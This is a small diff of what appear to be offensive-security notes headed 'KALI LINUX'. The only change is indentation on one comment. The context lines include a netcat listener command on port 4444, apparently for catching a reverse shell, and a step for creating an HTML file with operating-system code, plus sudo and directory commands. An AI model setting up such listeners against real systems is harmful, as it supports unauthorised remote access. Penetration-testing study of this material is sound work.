@@ -2,7 +2,7 @@
 # KALI LINUX #
   // Set up listener on Kali Linux
   nc -lvp 4444
-// Create an HTML file with the corresponding Operating System code.
+  // Create an HTML file with the corresponding Operating System code.
 	sudo su
 	mkdir "name"
 	cd "name"
